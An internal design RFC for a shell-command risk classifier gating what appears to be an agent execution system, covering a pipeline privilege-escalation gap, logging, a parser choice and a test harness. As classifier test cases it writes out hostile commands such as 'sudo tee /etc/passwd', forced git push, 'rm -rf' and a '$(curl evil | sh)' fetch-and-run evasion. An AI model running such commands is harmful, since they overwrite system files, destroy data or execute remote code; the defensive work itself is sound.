---
rfc: "0208"
title: "Shell IR Phase 2 — compositional risk algebra over a real AST (morbig front-end), single decision substrate, floor retirement"
status: Draft
created: 2026-06-01
updated: 2026-06-01
author: vincent
supersedes: []
superseded_by: null
related: ["0005", "0042", "0054", "0160"]
implementation_prs: []
---

## §0 · Context

RFC-0160 ("Shell IR 1급 승격") promoted Shell IR from a transit envelope to
a single-source decision substrate and closed its 7 KPIs (G1–G8). Since then
26 "batch" PRs expanded the typed GADT from 36 to 110 constructors. Static
adoption is high: `scripts/audit-shell-ir-consumption.sh` shows all gates at
target, and the phantom-envelope invariant (`undecided → classify → decided`)
is sound — every dispatch flows through one `classify` site
(`lib/exec/shell_ir_risk.ml`, the sole `classify` function) before
`Exec_dispatch.dispatch_decided`.

Three findings from a 2026-06-01 audit (fleet logs + source) show the
*runtime reality* diverges from the static picture:

1. **Confirmed safety hole — pipelines bypassed typed risk (closed by P0).**
   Before this RFC's P0 implementation, `shell_ir_risk.ml` hardcoded
   `Pipeline _ -> R0_Read`. The word-list floor flattened all stages
   (`flat_stage_words`) into one list, and `is_destructive_bash_operation`
   matched only on the *head* token plus a narrow set (`git push --force`,
   `rm -rf`). Result: a privilege-escalation or destructive command in any
   non-head pipeline stage classified as `R0_Read` (safe). Examples that
   were silently under-classified:
   - `echo x | sudo tee /etc/passwd`
   - `cat f | git push --force origin main`
   - `sudo cat f | grep y` (sudo anywhere in a pipeline; the typed `W (Sudo)`
     arm only fired for a `Simple`, never inside a `Pipeline`).
   P0 replaces the blanket `Pipeline _ -> R0_Read` with a per-stage
   compositional `max_risk` fold (see §4), so every stage now contributes
   its typed risk. Regression tests for non-head-stage escalation ship with
   the P0 PR.

2. **No runtime observability of typed coverage.** The dispatch log
   (`lib/keeper/agent_tool_execute_runtime.ml`, the dispatch telemetry site)
   records `keeper / sandbox / status / elapsed_ms` only. The `decided_ir` (with
   `risk_class`) is in scope at the log site but unused; `classify` discards
   which path won (typed vs word-floor). The 110 constructors are invisible in
   production — nobody can measure what fraction of the ~800 dispatches/day
   actually match a typed constructor vs fall to `Generic`.

3. **Denials are silent.** Of the six reject branches
   (destructive-block, write-gate, `Gate_reject`, `Cannot_parse`,
   `Too_complex`, `Path_reject`) none emit a log line — they return error
   JSON only. Fleet logs (2026-06-01): 799 success INFO lines, 0 Keeper-level
   WARN/ERROR for the 12 blocked commands. Security-relevant denials are not
   greppable.

### Duplicate-surface inventory (consolidation targets)

| # | Duplicate surface | Today | Target |
|---|-------------------|-------|--------|
| 1 | **Two parsers** | typed parser (`bash_subset.mly`, head-lexer rejects compound as `Too_complex`) + `flat_stage_words` word flattening | one AST parser |
| 2 | **Two risk classifiers** | typed `risk_of_typed` (4-level) ‖ word-list `classify_words` (the string classifier RFC-0160 set out to remove, kept as floor) | one compositional risk algebra over the AST |
| 3 | **Two risk taxonomies** | phantom `[`Safe | `Audited | `Privileged]` (GADT 3rd type param + `gen_risk` walker + `exec_program.risk`) ‖ operational `risk_class` (R0/R1/R2/Destructive_protected, used by the gate) | one `risk_class` |

The `decision_of_simple` comment in `shell_ir_risk.ml` admits the floor
stays "until the typed model becomes complete enough to subsume it
(RFC-0160 follow-up)". This RFC is that follow-up.

## §1 · Goals (verifiable end-state)

| Goal | Metric | Baseline (2026-06-01) | Target |
|------|--------|------------------------|--------|
| H1 | Pipeline stages contribute typed risk | `Pipeline -> R0_Read` (0 stages read) | every stage's typed risk composed |
| H2 | Pipeline privilege/destructive test cases (non-head stage) | 0 | ≥ 6 (sudo/su/doas/git-push/rm-rf/tee-to-etc) |
| H3 | Dispatch log carries `risk_class` + `typed_hit` | absent | present, offline coverage computable |
| H4 | Reject branches emit a Keeper audit line | 0 / 6 | 6 / 6 |
| H5 | AST represents `&&`/`||`/`;`/subshell/`$()` as typed nodes | rejected as `Too_complex` | first-class AST nodes |
| H6 | Single risk taxonomy (phantom 3-level retired) | 2 taxonomies | 1 (`risk_class`) |
| H7 | Word-list floor retired per command-class behind a monotone-safety harness | floor load-bearing | floor = audit-only, then removed when coverage ≥ threshold |
| H8 | TLA+ spec models `Generic` + `Pipeline` + word-floor `max_risk` | happy-path 4-state only | invariant constrains the actual runtime |

## §2 · Architecture — the spellbook substrate

```
raw string
  │ morbig (Menhir LR(1), POSIX-correct, context-dependent lexing solved)
  ▼
morbig CST                       — And / Or / Seq / Pipe / Subshell / CmdSubst / Redirect
  │ lower (one declarative command spec per program)
  ▼
Shell_ast.t   ← spellbook spec registry (declarative, typed, composable)
  │ risk catamorphism (compositional / parallel over independent subtrees)
  ▼
decided decided_ir (single risk_class)  ── single gate ── dispatch
```

- **AST, not flat words.** `Shell_ir.t` grows from `Simple | Pipeline` to a
  small command algebra: `Simple | Pipe | And | Or | Seq | Subshell |
  Cmd_subst | Redirected`. Logic operators, subshells and command
  substitution become structured nodes instead of `Too_complex` rejections or
  `Generic` fallthrough.

- **Compositional risk (the algebra).** Risk becomes a fold over the AST:
  - `risk (And (a, b)) = max (risk a) (risk b)`
  - `risk (Pipe stages) = fold max R0 (map risk stages)` ← **closes finding 1**
  - `risk (Cmd_subst inner) = risk inner` ← closes `$(curl evil | sh)` evasion
  - `risk (Simple s) = risk_of_typed (lower s)`
  This is "병렬 조합": independent subtrees carry independent verdicts that
  compose by `max`. The P0 fix below is the embryo of this fold.

- **Spellbook spec registry.** Each command is one declarative typed spec:
  `{ name; arg_grammar; risk; sandbox; path_args; reversibility }`. Adding a
  command = adding one spec entry. This is the data-driven successor to the
  hand-written 110 GADT arms + per-command parser batches. It keeps types
  strong (Parse-don't-validate): specs are typed values, not stringly config,
  and the GADT/`decided` phantom envelope is preserved.

- **Preserve what is sound (do not regress):** the phantom
  `undecided → decided` envelope, the single `classify` gate, and `max_risk`
  monotonicity. The new algebra plugs into the *same* envelope.

## §3 · morbig decision (evidence-record)

- **Evidence**: https://github.com/colis-anr/morbig ; SLE 2018 (ACM SIGPLAN,
  doi 10.1145/3276604.3276615) ; opam `morbig.0.11.0` (2023-04-14).
- **Timestamp**: 2026-06-01.
- **Confidence**: High (existence/technique/license); Medium (OCaml 5.x build).
- **Delta**: morbig is a static POSIX-shell parser in OCaml+Menhir using
  context-dependent lexing — exactly the hard part masc currently avoids by
  rejecting compound constructs at the lexer. Adopting it means parsing cost
  goes to 0 for us; effort concentrates on lowering + risk algebra + harness.

Facts and the decisions they force:

- **License = GPL3** (+ Section 7 POSIX-reprint notice that must propagate to
  "any product containing this material"). masc is **internal infra, not
  distributed** → linking GPL3 is permissible for internal use. Conscious
  cost: this **blocks future open-sourcing / distribution** of masc while
  morbig is linked. Mitigation path if that changes: invoke `morbig --as json`
  across a **process boundary** (aggregation, not derivative work — copyleft
  does not propagate), trading per-command process-spawn latency for license
  cleanliness. **Decision: link as library for internal use; record in a
  `THIRD-PARTY-LICENSES` note; revisit on any distribution intent.**
- **OCaml ≥ 4.11 documented; 5.x not stated.** masc is OCaml 5.4.1. `opam
  show morbig` reports `available` in the 5.4.1 switch (constraints do not
  exclude it), but availability ≠ builds. **Gate: P3 spike must `opam install
  morbig` + parse a corpus before any consumer code depends on it.** If it
  fails on 5.x, fall back to a vendored minimal parser using morbig's
  published techniques (the alternative the author considered).

## §4 · Phase plan (harness-first)

Each phase is independently shippable. P0 is a self-contained security fix
that lands now; P1–P2 unlock measurement; P3+ is the migration.

### P0 · Pipeline compositional risk (security fix, ships now)

Replace `Pipeline _ -> R0_Read` with a recursive fold that runs the existing
typed classifier per stage:

```ocaml
let rec typed_risk_of_ir (ir : Shell_ir.t) : risk_class =
  match ir with
  | Shell_ir.Simple s -> risk_of_typed (Shell_ir_typed.of_simple s)
  | Shell_ir.Pipeline stages ->
    List.fold_left
      (fun acc stage -> max_risk acc (typed_risk_of_ir stage))
      R0_Read stages
```

- **Monotone-safe**: `max over stages ≥ R0`, so the new verdict is `≥` the old
  for every input — no previously-allowed command is newly broken; only
  under-classified ones escalate. This is the migration's safety invariant,
  demonstrated on the smallest possible change.
- **No new string classifier** (anti-workaround): reuses `risk_of_typed` and
  the existing `W (Sudo)` arm. Closes finding 1 structurally.
- **Standalone-testable**: `masc_exec` is a self-contained library; the fix +
  tests build even while `main` is red from the unrelated cascade migration.
- Tests (H2): non-head-stage `sudo`/`su`/`doas`/`git push --force`/`rm -rf`/
  `tee → /etc` pipelines escalate; benign read pipelines (`ls | grep`) stay R0.

### P1 · Observability (additive logging, unlocks measurement)

- H3: add `risk_class` + `typed_hit:bool` to the dispatch log; `typed_hit` =
  typed_risk came from a real constructor (not `Generic`). Offline scan →
  Generic-fallback rate, the real coverage of the 110 constructors.
- H4: `Log.Keeper.warn` on each of the six reject branches with
  `keeper / sanitized cmd / risk_class / reason`.
- Touches `lib/keeper/` (red main) → lands when main builds, or as a
  signature-preserving `decided_ir` field plus a keeper-side one-line edit.

### P2 · Differential-safety harness (the gate for all later phases)

- Corpus: `bash_history` prefixes + the P1-logged stream + a synthetic
  adversarial suite (the morbig test corpus is a ready source).
- Property (QCheck + alcotest): `∀ cmd. new_risk(cmd) ≥ floor_risk(cmd)`.
  A command-class may leave the floor only when the AST classifier provably
  dominates the floor on the corpus.
- Extends `audit-shell-ir-consumption.sh` with a runtime-coverage KPI.

**Status: implemented as deterministic corpus coverage**
(`lib/exec/test/test_shell_ir_differential.ml`). The harness asserts the
monotone-safety invariant over a curated corpus and reports floor-retirement
readiness. The QCheck property above remains future expansion rather than part
of the current P2 implementation. Baseline run (2026-06-01, 31-command corpus):
typed_hit 90%, floor-redundant **77%**, NOT READY — 7 command classes needed the
floor because `risk_of_typed` did not read their typed fields. The harness then
drove P3 (below).

### P3 · Harness-driven typed-classifier completion

Close the floor-redundancy gaps the harness reports, using fields the
typed model already carries plus shared sub-classifiers (no new
duplicate surface). Progress (floor-redundant 77% → **94%**, 5/7 closed):

| command | before | after | how |
|---------|--------|-------|-----|
| `git checkout` | R0 | R1 | typed arm matches the floor (working-tree write) |
| `git reset` | R0 | R2 | typed arm matches the floor |
| `gh pr create` | R0 | R1 | delegate to the shared `classify_repo_hosting_cli` |
| `gh pr merge` | R0 | R2 | delegate (round-trip preserves subcommand/action) |
| `gh api graphql` mutation | R0 | R2 | delegate (round-trip preserves the body) |
| `gh api -X DELETE` | R0 | R0 | **blocked → P4** |
| `gh api -X POST` | R0 | R0 | **blocked → P4** |

The two remaining need a field the typed `Gh` shape lacks: the HTTP
method (`-X DELETE`) is carried in the untyped `rest`, and the
`to_simple` round-trip does not recover it (`Gh` has no `method` field,
unlike `Curl.method_`). That is the precise P4 target.

### P4 · Typed-shape field completion

Add the missing typed fields the harness still flags — first
`Gh.method` (mirroring `Curl.method_`), parsed and round-tripped
faithfully, so `gh api -X METHOD` becomes typed (dropping the P3
delegation for it). Closes the last floor-redundancy gaps for the
current corpus.

### P5 · morbig front-end + AST nodes (And/Or/Seq/Subshell/CmdSubst) ·
### P6 · spellbook spec registry ·
### P7 · floor retirement (per-class, gated on harness 100% for the class) ·
### P8 · risk-taxonomy unification (retire phantom 3-level) ·
### P9 · TLA+ spec extension (model Generic/Pipeline/floor `max_risk`)

(Detailed per-phase design lands as each phase's PR; P5+ depends on the morbig
spike outcome.)

### Revision (2026-06-02): gh is string-borne — P4 withdrawn, P7 scoped

P4 above proposed a typed `Gh.method` field to make `gh api -X METHOD`
typed-redundant and complete floor retirement for gh. **That direction is
withdrawn.** An adversarial audit (11-agent workflow + 3-lens refutation)
showed gh risk is *irreducibly string-borne*: beyond `-X METHOD`, a write
is also implied by bare `-f`/`--field`/`--raw-field` (forces POST), by the
graphql mutation body (`body_contains_r2_mutation`), and by a large,
evolving set of subcommands. Typing only `method` silently under-classifies
`gh api -f title=… /repos/o/r/issues` (R1 today → R0). Typing *all* of it
would re-implement `classify_repo_hosting_cli` reading from typed fields —
a **second** gh-risk implementation, i.e. more duplication, not less. And
because `classify = max(risk_of_typed, floor)`, typing the structural subset
(`pr merge`, `repo delete`) changes nothing at the gate — it is cosmetic.

Decision (B1): the typed path returns `R0` for `Gh`, and the word-list floor
(`classify_repo_hosting_cli`, on the original words) owns gh risk **by
design and permanently**. This removes the fake P3 round-trip (which had
mis-parsed `-X DELETE` to R0) and the duplicate invocation —
`classify_repo_hosting_cli` is now called from one site (the floor). The
boundary: **structural** risk (`rm -rf`, `git reset`, `sudo`) is typed;
**string-borne** risk (gh) is floor-owned. P7 floor retirement is therefore
scoped to structurally-typed classes only and never covers gh; the
differential harness reports structural vs string-borne load-bearing
separately so "READY" means "every structural class is typed," not "gh is
typed." The capability axis (`Gh → \`Audited`) is unaffected (P10).

Incident note: PR #19762's squash dropped the P4 commit (`40e6f7e265`)
entirely, so merged `d33d87dc2f` was 94% (gh `-X` load-bearing), not the
100% reported from the branch tip. Only re-running the harness *on the
merged tree* caught it — `@check` EXIT=0 ("compiles") did not. The quick
suite runs the harness but is `continue-on-error` (non-gating), so it could
not block the drop. B1 adds a hard-fail focused harness gate in the `build`
job (`@lib/exec/test/runtest-test_shell_ir_differential`).

## §5 · Workaround Rejection Bar (self-check)

| Signature | This RFC |
|-----------|----------|
| telemetry-as-fix | P1 adds telemetry, but P0 is the structural fix; telemetry is a measurement prerequisite, not the fix |
| substring classifier | NO — P0 removes reliance on the head-only string check; the endgame retires the word-list floor entirely |
| N-of-M | EXPLICIT phases; P6 retires the transitional floor; no silent partial |
| cap/cooldown/dedup/repair | NO |
| catch-all `_ ->` | NO — closed sums + exhaustive folds |

## §6 · Open questions

1. AST node set: minimal (`And/Or/Seq/Pipe/Subshell/Cmd_subst`) vs full POSIX
   CST passthrough. Default: minimal domain AST, morbig CST lowered into it.
2. Spec registry encoding: GADT-backed typed specs vs first-class module per
   command. Default: keep GADT for compile-time exhaustiveness; specs generate
   the arms (RFC-0054 codegen track, which is already active).
3. Floor-retirement threshold: what corpus coverage justifies dropping a
   command-class from the floor. Default: 100% domination on the P2 corpus for
   that class + no `Generic` fallthrough for it.
